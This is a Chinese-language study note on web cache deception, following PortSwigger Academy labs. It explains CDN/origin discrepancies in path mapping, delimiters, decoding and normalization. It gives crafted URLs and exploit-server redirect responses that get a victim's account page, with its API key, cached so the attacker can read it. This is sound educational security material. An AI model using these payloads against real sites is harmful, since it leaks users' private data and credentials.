---
title: Web cache deception
description: Web cache deception
---

## Path mapping discrepancies

假設有以下網址

```
https://www.google.com/user/123/profile.json
```

傳統的 Web Server 在處理 URL Path 時，會映射到實體的 File Path

但 Restful API 可能是這樣註冊的

```js
app.get("/user/:id", getUserProfile);
```

所以對於 Restful API

```
https://www.google.com/user/123/script.js
https://www.google.com/user/123/style.css
```

可能都是進到同樣的 route => 回傳 userProfile

攻擊者可以構造以上 URL，讓 CDN 把包含 userProfile 的 `.js`, `.css` 快取

## Lab: Exploiting path mapping for web cache deception

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-deception#path-mapping-discrepancies      |
| Lab       | https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping |

這題的 /my-account 頁面含有 API Key，嘗試讓 /my-account 頁面也被快取

```js
https://0a8200f303c345b2825b92e200480080.web-security-academy.net/my-account/hello.js
```

有正確被快取

```
age: 0
cache-control: max-age=30
x-cache: miss
```

在 exploit-server 構造

```
HTTP/1.1 302 Found
Location: https://0a8200f303c345b2825b92e200480080.web-security-academy.net/my-account/hello.js
```

Deliver exploit to victim 之後，在登入的情況訪問 /my-account/hello.js，就會吃到 victim 的快取

1. 未登入情況，沒有 cookie.session，訪問 /my-account/hello.js 會被 302 導回 /login，所以這題要在登入情況訪問
2. 確保 /hello.js 這把 cache key 沒有被快取過，victim 點擊以後快取 30 秒，並且在 30 秒內盡快訪問 /my-account/hello.js

## Delimiter discrepancies

https://portswigger.net/web-security/web-cache-deception#delimiter-discrepancies

利用 CDN 跟 Origin Server 處理 delimiter 的差異，假設有以下 path

```
/profile;foo.css
```

- Origin Server 將 `;` 視為 delimiter，實際是 routing 到 `/profile`
- CDN 將整段 `/profile;foo.css` 視為一個 css 檔案，故成功把 Origin Server 回傳的 `/profile` 內容寫入快取

[Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)

## Lab: Exploiting path delimiters for web cache deception

| Dimension | Description                                                                                 |
| --------- | ------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-deception#delimiter-discrepancies            |
| Lab       | https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters |

在 exploit-server 構造

```
HTTP/1.1 302 Found
Location: https://0a1800a904a8983480ef1ca400770036.web-security-academy.net/my-account;hello.js
```

Deliver exploit to victim 之後，在登入的情況訪問 /my-account;hello.js，就會吃到 victim 的快取

## Delimiter decoding discrepancies

https://portswigger.net/web-security/web-cache-deception#delimiter-decoding-discrepancies

利用 CDN 跟 Origin Server 處理 URL decode 的差異，假設有以下 path

```
/profile%23style.css
```

Origin Server 將 `%23` decode 以後變成 `#`，實際是 routing 到 `/profile`
CDN 將整段 `/profile%23style.css` 視為一個 css 檔案，故成功把 Origin Server 回傳的 `/profile` 內容寫入快取

這概念在 [API Testing](./api-testing.md#server-side-parameter-pollution-in-the-query-string) 跟 [SSRF](./ssrf.md#lab-ssrf-with-whitelist-based-input-filter) 都有運用到，算是很實用的技巧

另外還有一個 CDN 跟 Origin Server 的實作差異，假設有以下 path

```
/profile%3fstyle.css
```

- CDN 收到後，決定快取 css，但 forward 給 Origin Server 前，先把 URL decode，變成 `/profile?style.css`
- Origin Server 收到後，routing 到 `/profile`，登入的人類訪問這個 URL 就會中招

## Normalization discrepancies

https://portswigger.net/web-security/web-cache-deception#normalization-discrepancies

利用 CDN 跟 Origin Server 處理 URL normalization 的差異，假設有以下 path

```
/static/..%2fprofile
```

- Origin Server 將其 normalize 為 `/profile`
- CDN 沒有進行 normalize，並且 `/static/` 路徑底下會快取

## Detecting normalization by the origin server

比較以下兩個 non-cacheable + non-idempotent 請求的 Response 是否有差異

```
POST /profile
POST /aaa/..%2fprofile
```

有差異 => 代表 Origin Server 沒有 normalization

## Detecting normalization by the cache server

先找到一個有被快取的 resource，假設是

```
assets/js/script.js
```

嘗試

```
/aaa/..%2fassets/js/stockCheck.js
```

若 Response 一樣是吃到快取的，代表 cache server 有 normalization

## Lab: Exploiting origin server normalization for web cache deception

| Dimension | Description                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-deception#exploiting-normalization-by-the-origin-server  |
| Lab       | https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization |

觀察 `/resources` 底下的 js,css 有快取，嘗試

```
/resources/..%2fmy-account
```

觀察到有被快取

```
age: 0
cache-control:max-age=30
x-cache: miss
```

在 exploit-server 構造

```
HTTP/1.1 302 Found
Location: https://0a1a00fc0390a75d8284293700b800c9.web-security-academy.net/resources/..%2fmy-account
```

Deliver exploit to victim 之後，在登入的情況訪問 /resources/..%2fmy-account，就會吃到 victim 的快取

## Lab: Exploiting cache server normalization for web cache deception

| Dimension | Description                                                                                            |
| --------- | ------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/web-cache-deception#exploiting-normalization-by-the-cache-server  |
| Lab       | https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization |

## 參考資料

- https://portswigger.net/web-security/web-cache-deception
